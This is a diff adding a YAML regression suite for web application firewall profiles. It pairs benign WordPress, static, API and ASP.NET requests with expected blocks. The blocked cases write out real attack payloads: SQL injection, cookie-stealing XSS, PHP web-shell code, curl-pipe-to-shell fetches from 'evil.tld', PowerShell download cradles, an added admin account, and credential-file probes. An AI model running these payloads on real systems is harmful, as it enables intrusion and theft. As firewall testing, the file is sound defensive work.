@@ -1,0 +1,531 @@
+# Site profiles (profiles/web-common, php, wordpress, static, api, aspnet) and the optional AWS use-case
+# groups they enable (Linux, POSIX, Windows, PHP, WordPress). Lab sites p-<profile> (lab/config/sites/p-*.yaml).
+# Generated from requests run against the profiles; terminating_rule is the first rule that blocks.
+version: 1
+cases:
+- id: wp-home
+  site: p-wordpress
+  request:
+    path: /
+  expect:
+    status: 200
+    terminating_rule: Default_Action
+- id: wp-search
+  site: p-wordpress
+  request:
+    path: /?s=how+to+install+plugins
+  expect:
+    status: 200
+    terminating_rule: Default_Action
+- id: wp-theme-css
+  site: p-wordpress
+  request:
+    path: /wp-content/themes/twentytwentyfour/style.css?ver=6.5
+  expect:
+    status: 200
+    terminating_rule: Default_Action
+- id: wp-login-form
+  site: p-wordpress
+  request:
+    path: /wp-login.php
+  expect:
+    status: 200
+    terminating_rule: Default_Action
+- id: wp-login-post
+  site: p-wordpress
+  request:
+    method: POST
+    path: /wp-login.php
+    body: log=admin&pwd=S3cret%21%24%28x%29&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F&testcookie=1
+  expect:
+    status: 200
+    terminating_rule: Default_Action
+- id: wp-heartbeat
+  site: p-wordpress
+  request:
+    method: POST
+    path: /wp-admin/admin-ajax.php
+    body: action=heartbeat&_nonce=abc123&data%5Bwp-refresh-post-lock%5D%5Bpost_id%5D=12
+  expect:
+    status: 200
+    terminating_rule: Default_Action
+- id: wp-rest-posts
+  site: p-wordpress
+  request:
+    path: /wp-json/wp/v2/posts?per_page=10
+  expect:
+    status: 200
+    terminating_rule: Default_Action
+- id: wp-cron
+  site: p-wordpress
+  request:
+    path: /wp-cron.php?doing_wp_cron=1716900000.1234
+  expect:
+    status: 200
+    terminating_rule: Default_Action
+- id: wp-comment-clean
+  site: p-wordpress
+  request:
+    method: POST
+    path: /wp-comments-post.php
+    body: comment=Great+post%2C+thanks%21+I+use+id+and+env+too&author=Mario&email=m%40x.it&comment_post_ID=12
+  expect:
+    status: 200
+    terminating_rule: Default_Action
+- id: wp-editor-classic
+  site: p-wordpress
+  request:
+    method: POST
+    path: /wp-admin/post.php
+    body: post_title=Shell+tips&content=%3Cp%3ERun+%3Ccode%3Ecat+%2Fetc%2Fpasswd%3C%2Fcode%3E+and+%3Cscript%3Ealert(1)%3C%2Fscript%3E+%3C%3Fphp+echo+%24_GET%5Bx%5D%3B+%3F%3E%3C%2Fp%3E&action=editpost&post_ID=12
+  expect:
+    status: 200
+    terminating_rule: Default_Action
+- id: wp-editor-rest
+  site: p-wordpress
+  request:
+    method: POST
+    path: /wp-json/wp/v2/posts/12
+    body: '{"content":"<p>select * from users where id=1 union select 1</p><script>alert(1)</script>"}'
+    content_type: application/json
+  expect:
+    status: 200
+    terminating_rule: Default_Action
+- id: wp-author-logged-in
+  site: p-wordpress
+  request:
+    path: /?author=1
+    headers:
+      Cookie: wordpress_logged_in_abc=admin%7C123
+  expect:
+    status: 200
+    terminating_rule: Default_Action
+- id: wp-xmlrpc
+  site: p-wordpress
+  request:
+    path: /xmlrpc.php
+  expect:
+    status: 403
+    terminating_rule: WordPressExploitablePaths_URIPATH
+- id: wp-config
+  site: p-wordpress
+  request:
+    path: /wp-config.php
+  expect:
+    status: 403
+    terminating_rule: WordPressExploitablePaths_URIPATH
+- id: wp-config-backup
+  site: p-wordpress
+  request:
+    path: /wp-config.php~
+  expect:
+    status: 403
+    terminating_rule: WordPressExploitablePaths_URIPATH
+- id: wp-install
+  site: p-wordpress
+  request:
+    path: /wp-admin/install.php
+  expect:
+    status: 403
+    terminating_rule: WordPressExploitablePaths_URIPATH
+- id: wp-upload-php
+  site: p-wordpress
+  request:
+    path: /wp-content/uploads/x.phtml
+  expect:
+    status: 403
+    terminating_rule: WordPressExploitablePaths_URIPATH
+- id: wp-wlwmanifest
+  site: p-wordpress
+  request:
+    path: /wp-includes/wlwmanifest.xml
+  expect:
+    status: 403
+    terminating_rule: WordPressExploitablePaths_URIPATH
+- id: wp-file-manager
+  site: p-wordpress
+  request:
+    path: /wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php
+  expect:
+    status: 403
+    terminating_rule: WordPressExploitablePaths_URIPATH
+- id: wp-reset-cmd
+  site: p-wordpress
+  request:
+    path: /wp-admin/admin.php?page=wp_reset&action=do-reset-wordpress
+  expect:
+    status: 403
+    terminating_rule: WordPressExploitableCommands_QUERYSTRING
+- id: wp-user-enum-author
+  site: p-wordpress
+  request:
+    path: /?author=1
+  expect:
+    status: 403
+    terminating_rule: WordPressBlockUserEnumQuery
+- id: wp-user-enum-rest
+  site: p-wordpress
+  request:
+    path: /wp-json/wp/v2/users
+  expect:
+    status: 403
+    terminating_rule: WordPressBlockUserEnumRest
+- id: wp-user-enum-route
+  site: p-wordpress
+  request:
+    path: /?rest_route=/wp/v2/users
+  expect:
+    status: 403
+    terminating_rule: WordPressBlockUserEnumRestRoute
+- id: wp-readme
+  site: p-wordpress
+  request:
+    path: /readme.html
+  expect:
+    status: 403
+    terminating_rule: WordPressBlockFingerprintFiles
+- id: wp-plugin-readme
+  site: p-wordpress
+  request:
+    path: /wp-content/plugins/contact-form-7/readme.txt
+  expect:
+    status: 403
+    terminating_rule: WordPressBlockFingerprintFiles
+- id: wp-comment-xss
+  site: p-wordpress
+  request:
+    method: POST
+    path: /wp-comments-post.php
+    body: comment=%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E&comment_post_ID=12
+  expect:
+    status: 403
+    terminating_rule: WordPressXssBodyOutsideEditor
+- id: wp-comment-sqli
+  site: p-wordpress
+  request:
+    method: POST
+    path: /wp-comments-post.php
+    body: comment=1%27+union+select+user_pass+from+wp_users--+-&comment_post_ID=12
+  expect:
+    status: 403
+    terminating_rule: WordPressSqliBodyOutsideEditor
+- id: wp-body-php
+  site: p-wordpress
+  request:
+    method: POST
+    path: /?x=1
+    body: a=%3C%3Fphp+system(%24_GET%5Bc%5D)%3B+%3F%3E
+  expect:
+    status: 403
+    terminating_rule: WordPressPhpBodyOutsideEditor
+- id: wp-ajax-shell
+  site: p-wordpress
+  request:
+    method: POST
+    path: /wp-admin/admin-ajax.php
+    body: action=x&cmd=%3Bcurl+http%3A%2F%2Fevil.tld%2Fs.sh%7Csh
+  expect:
+    status: 403
+    terminating_rule: WordPressShellBodyOutsideEditor
+- id: web-env
+  site: p-wordpress
+  request:
+    path: /.env
+  expect:
+    status: 403
+    terminating_rule: BlockSensitiveFiles
+- id: web-git
+  site: p-wordpress
+  request:
+    path: /.git/config
+  expect:
+    status: 403
+    terminating_rule: BlockSensitiveFiles
+- id: web-aws-creds
+  site: p-wordpress
+  request:
+    path: /.aws/credentials
+  expect:
+    status: 403
+    terminating_rule: BlockSensitiveFiles
+- id: web-composer
+  site: p-wordpress
+  request:
+    path: /composer.json
+  expect:
+    status: 403
+    terminating_rule: BlockSensitiveFiles
+- id: web-backup
+  site: p-wordpress
+  request:
+    path: /backup.zip
+  expect:
+    status: 403
+    terminating_rule: BlockSensitiveFiles
+- id: web-phpunit
+  site: p-wordpress
+  request:
+    path: /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+  expect:
+    status: 403
+    terminating_rule: BlockScannerProbes
+- id: web-actuator
+  site: p-wordpress
+  request:
+    path: /actuator/env
+  expect:
+    status: 403
+    terminating_rule: BlockScannerProbes
+- id: web-cgi-bin
+  site: p-wordpress
+  request:
+    path: /cgi-bin/luci
+  expect:
+    status: 403
+    terminating_rule: BlockScannerProbes
+- id: php-phpinfo
+  site: p-wordpress
+  request:
+    path: /info.php
+  expect:
+    status: 403
+    terminating_rule: BlockPhpProbes
+- id: php-phpmyadmin
+  site: p-wordpress
+  request:
+    path: /phpmyadmin/
+  expect:
+    status: 403
+    terminating_rule: BlockDbAdminTools
+- id: php-adminer
+  site: p-wordpress
+  request:
+    path: /adminer.php
+  expect:
+    status: 403
+    terminating_rule: BlockDbAdminTools
+- id: php-wrapper
+  site: p-wordpress
+  request:
+    path: /index.php?page=php://filter/convert.base64-encode/resource=index
+  expect:
+    status: 403
+    terminating_rule: PHPHighRiskMethodsVariables_QUERYSTRING
+- id: php-thinkphp
+  site: p-wordpress
+  request:
+    path: /index.php?s=/index/think/app/invokefunction&function=call_user_func_array&vars%5B0%5D=system&vars%5B1%5D%5B%5D=id
+  expect:
+    status: 403
+    terminating_rule: PHPHighRiskMethodsVariables_QUERYSTRING
+- id: php-cgi-args
+  site: p-wordpress
+  request:
+    path: /cgi.php?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input
+  expect:
+    status: 403
+    terminating_rule: PHPHighRiskMethodsVariables_QUERYSTRING
+- id: php2shell-body
+  site: p-wordpress
+  request:
+    method: POST
+    path: /index.php
+    body: -d allow_url_include=1 -d auto_prepend_file=php://input
+  expect:
+    status: 403
+    terminating_rule: PHP2Shell_BODY
+- id: linux-lfi-header
+  site: p-wordpress
+  request:
+    path: /
+    headers:
+      Referer: http://x/?f=/etc/shadow
+  expect:
+    status: 403
+    terminating_rule: LFI_HEADER
+- id: unix-cmd-semicolon
+  site: p-wordpress
+  request:
+    path: /?q=1;id
+  expect:
+    status: 403
+    terminating_rule: UNIXShellCommandsVariables_QUERYSTRING
+- id: unix-cmd-pipe
+  site: p-wordpress
+  request:
+    path: /?ip=127.0.0.1%7Cwhoami
+  expect:
+    status: 403
+    terminating_rule: UNIXShellCommandsVariables_QUERYSTRING
+- id: unix-cmd-subshell
+  site: p-wordpress
+  request:
+    path: /?x=$(curl+http://evil.tld/a)
+  expect:
+    status: 403
+    terminating_rule: UNIXShellCommandsVariables_QUERYSTRING
+- id: unix-cmd-backtick
+  site: p-wordpress
+  request:
+    path: /?x=%60id%60
+  expect:
+    status: 403
+    terminating_rule: UNIXShellCommandsVariables_QUERYSTRING
+- id: static-page
+  site: p-static
+  request:
+    path: /about/index.html
+  expect:
+    status: 200
+    terminating_rule: Default_Action
+- id: static-asset
+  site: p-static
+  request:
+    path: /assets/app.3f2a1b.js
+  expect:
+    status: 200
+    terminating_rule: Default_Action
+- id: static-utm
+  site: p-static
+  request:
+    path: /?utm_source=newsletter&utm_medium=email&utm_campaign=spring_sale
+  expect:
+    status: 200
+    terminating_rule: Default_Action
+- id: static-search-cmd-words
+  site: p-static
+  request:
+    path: /search?q=python+-c+vs+perl
+  expect:
+    status: 200
+    terminating_rule: Default_Action
+- id: static-search-net-user
+  site: p-static
+  request:
+    path: /?q=net+user+guide
+  expect:
+    status: 200
+    terminating_rule: Default_Action
+- id: static-post
+  site: p-static
+  request:
+    method: POST
+    path: /contact
+    body: a=1
+  expect:
+    status: 403
+    terminating_rule: BlockWriteMethods
+- id: static-php
+  site: p-static
+  request:
+    path: /index.php
+  expect:
+    status: 403
+    terminating_rule: BlockServerSideScripts
+- id: static-aspx
+  site: p-static
+  request:
+    path: /login.aspx
+  expect:
+    status: 403
+    terminating_rule: BlockServerSideScripts
+- id: api-get
+  site: p-api
+  request:
+    path: /api/v1/orders?status=open&limit=50
+  expect:
+    status: 200
+    terminating_rule: Default_Action
+- id: api-json
+  site: p-api
+  request:
+    method: POST
+    path: /api/v1/orders
+    body: '{"items":[{"sku":"A-1","qty":2}],"note":"deliver after 5pm; ring twice"}'
+    content_type: application/json
+  expect:
+    status: 200
+    terminating_rule: Default_Action
+- id: api-no-ua
+  site: p-api
+  request:
+    path: /api/v1/health
+    headers:
+      User-Agent: ''
+  expect:
+    status: 200
+    terminating_rule: Default_Action
+- id: api-sqli
+  site: p-api
+  request:
+    path: /api/v1/orders?id=1%27+or+%271%27=%271
+  expect:
+    status: 403
+    terminating_rule: SQLi_QUERYARGUMENTS
+- id: api-sh-c
+  site: p-api
+  request:
+    path: /x?c=sh+-c+%27id%27
+  expect:
+    status: 403
+    terminating_rule: UNIXShellCommandsVariables_QUERYSTRING
+- id: aspnet-page
+  site: p-aspnet
+  request:
+    path: /Default.aspx?ReturnUrl=%2fAccount%2fLogin
+  expect:
+    status: 200
+    terminating_rule: Default_Action
+- id: aspnet-unix-ignored
+  site: p-aspnet
+  request:
+    path: /?q=1;id
+  expect:
+    status: 200
+    terminating_rule: Default_Action
+- id: win-cmd
+  site: p-aspnet
+  request:
+    path: /?x=1|cmd.exe+/c+dir
+  expect:
+    status: 403
+    terminating_rule: WindowsShellCommands_QUERYARGUMENTS
+- id: win-net-user
+  site: p-aspnet
+  request:
+    path: /?x=%26%26net+user+hacker+P4ss+/add
+  expect:
+    status: 403
+    terminating_rule: WindowsShellCommands_QUERYARGUMENTS
+- id: win-system32
+  site: p-aspnet
+  request:
+    path: /?f=c:\windows\system32\drivers\etc\hosts
+  expect:
+    status: 403
+    terminating_rule: GenericLFI_QUERYARGUMENTS
+- id: ps-encoded
+  site: p-aspnet
+  request:
+    path: /?x=powershell+-enc+SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA
+  expect:
+    status: 403
+    terminating_rule: WindowsShellCommands_QUERYARGUMENTS
+- id: ps-download-body
+  site: p-aspnet
+  request:
+    method: POST
+    path: /x
+    body: a=IEX(New-Object+Net.WebClient).DownloadString(%27http://e/a%27)
+  expect:
+    status: 403
+    terminating_rule: PowerShellCommands_BODY
+- id: ps-cookie
+  site: p-aspnet
+  request:
+    path: /
+    headers:
+      Cookie: sess=Invoke-Expression+x
+  expect:
+    status: 403
+    terminating_rule: PowerShellCommands_COOKIE
